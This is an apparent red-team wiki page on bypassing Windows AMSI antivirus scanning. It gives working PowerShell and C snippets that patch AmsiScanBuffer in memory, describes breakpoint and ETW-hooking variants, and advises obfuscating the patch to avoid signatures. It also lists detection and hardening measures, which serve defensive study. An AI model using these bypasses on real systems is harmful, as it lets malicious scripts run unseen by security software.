---
title: AMSI bypass
slug: amsi-bypass
---

> **TL;DR:** AMSI is a userland scanning interface — patch `AmsiScanBuffer` in-process so it returns clean, and PowerShell/JScript stop forwarding to Defender for the rest of the session.

## What it is
The Antimalware Scan Interface (`amsi.dll`) is a Windows API that script hosts (PowerShell, WSH, Office VBA, .NET in-memory assemblies) call before executing untrusted content. The host passes a buffer to `AmsiScanBuffer`, which round-trips to the registered AV provider. Bypasses target the in-process surface — since AMSI runs in the host's address space, anything executing in that host can rewrite it.

## Preconditions / where it applies
- Code execution inside a script host that uses AMSI: `powershell.exe`, `pwsh.exe`, `wscript.exe`, `cscript.exe`, Office processes, `dotnet.exe` for loaded assemblies
- Read/write access to your own process memory (always true unless PPL or a third party set memory protections)
- AMSI signatures are constantly updated, so the literal one-liner changes — the pattern survives

## Technique
Canonical approach: find `AmsiScanBuffer` in `amsi.dll`, flip page protections to RW, write a stub that forces `AMSI_RESULT_CLEAN` (0) and `S_OK`, restore protections. In PowerShell:

```powershell
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$f=$a.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null,$true)
```

That sets a managed flag that short-circuits scanning — fragile, signatured for years, but illustrates the pattern. Sturdier variants patch the unmanaged function directly:

```c
void* p = GetProcAddress(LoadLibrary("amsi.dll"), "AmsiScanBuffer");
DWORD old; VirtualProtect(p, 6, PAGE_EXECUTE_READWRITE, &old);
memcpy(p, "\x48\x31\xC0\xC3", 4); // xor rax,rax ; ret -> S_OK, score 0
VirtualProtect(p, 6, old, &old);
```

Variations: hardware breakpoint on `AmsiScanBuffer` and skip via Vectored Exception Handler (no memory write — defeats integrity checks), patch `AmsiOpenSession` to return failure so a session never registers, hook `NtTraceEvent` / `EtwEventWrite` simultaneously since AMSI itself emits an event when scanning happens.

Constrained Language Mode (CLM) blocks the managed reflection technique — Add-Type, reflection, and arbitrary type lookups are gone. You either need an unmanaged-side patch shipped via .NET P/Invoke from a non-CLM context, or you bypass CLM first.

Each substring of the patch gets signatured. Obfuscate, fetch strings from environment, build the byte array dynamically.

## Detection and defence
- AMSI providers report events with `Microsoft-Antimalware-Scan-Interface` ETW; tampering changes the rate to zero abruptly
- EDRs can monitor write access to `amsi.dll` in-memory regions via ETW Threat Intelligence
- Page protection changes on loaded modules to RWX are a strong signal
- WDAC + Constrained Language Mode + signed-only script policy + PPL Defender all materially raise the bar
- Defender enrolls in `MpClient!ScanContent` callbacks regardless — bypassing AMSI doesn't bypass on-access file scanning

## References
- [Microsoft Docs — AMSI](https://learn.microsoft.com/en-us/windows/win32/amsi/) — the official interface and behaviour
- [S3cur3Th1sSh1t — Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) — collection of historic bypasses with notes on lifespan
- [Pentest Partners blog](https://www.pentestpartners.com/security-blog/) — hardware-breakpoint variant write-ups
- [[etw-bypass]] [[edr-hooks-and-unhooking]]
